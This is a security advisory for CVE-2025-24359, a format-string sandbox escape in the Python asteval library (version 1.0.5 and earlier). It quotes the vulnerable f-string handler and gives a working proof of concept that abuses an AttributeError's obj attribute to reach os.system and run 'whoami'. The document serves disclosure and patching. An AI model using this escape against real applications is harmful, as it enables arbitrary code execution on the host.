# ASTEVAL Allows Maliciously Crafted Format Strings to Lead to Sandbox Escape

**GHSA**: GHSA-3wwr-3g9f-9gc7 | **CVE**: CVE-2025-24359 | **Severity**: high (CVSS 8.4)

**CWE**: CWE-134, CWE-749

**Affected Packages**:
- **asteval** (pip): <= 1.0.5

## Description

### Summary
If an attacker can control the input to the `asteval` library, they can bypass asteval's restrictions and execute arbitrary Python code in the context of the application using the library.

### Details
The vulnerability is rooted in how `asteval` performs handling of `FormattedValue` AST nodes. In particular, the [`on_formattedvalue`](https://github.com/lmfit/asteval/blob/cfb57f0beebe0dc0520a1fbabc35e66060c7ea71/asteval/asteval.py#L507) value uses the [dangerous format method of the str class](https://lucumr.pocoo.org/2016/12/29/careful-with-str-format/), as shown in the vulnerable code snippet below:

```py
    def on_formattedvalue(self, node): # ('value', 'conversion', 'format_spec')
        "formatting used in f-strings"
        val = self.run(node.value)
        fstring_converters = {115: str, 114: repr, 97: ascii}
        if node.conversion in fstring_converters:
            val = fstring_converters[node.conversion](val)
        fmt = '{__fstring__}'
        if node.format_spec is not None:
            fmt = f'{{__fstring__:{self.run(node.format_spec)}}}'
        return fmt.format(__fstring__=val)
```

The code above allows an attacker to manipulate the value of the string used in the dangerous call `fmt.format(__fstring__=val)`. This vulnerability can be exploited to access protected attributes by intentionally triggering an `AttributeError` exception. The attacker can then catch the exception and use its `obj` attribute to gain arbitrary access to sensitive or protected object properties.

### PoC
The following proof-of-concept (PoC) demonstrates how this vulnerability can be exploited to execute the `whoami` command on the host machine:

```py
from asteval import Interpreter
aeval = Interpreter()
code = """
# def lender():
#     ga
    
def pwn():
    try:
        f"{dict.mro()[1]:'\\x7B__fstring__.__getattribute__.s\\x7D'}"
    except Exception as ga:
        ga = ga.obj
        sub = ga(dict.mro()[1],"__subclasses__")()
        importer = None
        for i in sub:
            if "BuiltinImporter" in str(i):
                importer = i.load_module
                break
        os = importer("os")
        os.system("whoami")

# pre commit cfb57f0beebe0dc0520a1fbabc35e66060c7ea71, it was required to modify the AST to make this work using the code below
# pwn.body[0].handlers[0].name = lender.body[0].value # need to make it an identifier so node_assign works
        
pwn()
"""
aeval(code)

```
